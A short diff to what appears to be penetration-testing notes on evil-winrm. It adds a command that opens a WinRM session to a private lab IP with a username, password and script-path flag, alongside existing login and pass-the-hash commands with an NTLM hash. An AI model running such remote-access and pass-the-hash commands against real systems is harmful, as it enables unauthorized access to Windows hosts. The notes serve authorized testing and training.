@@ -3,6 +3,9 @@
 #log in directly into a WinRM session
 ./evil-winrm.rb -i 192.168.50.80 -u offensive -p security
 
+#connect to the target using evil-winrm with the -s argument to give us access to PowerShell scripts in the home directory
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.120.116 -u anirudh -p "SecureHM" -s .
 
 #pass the hash
 evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD
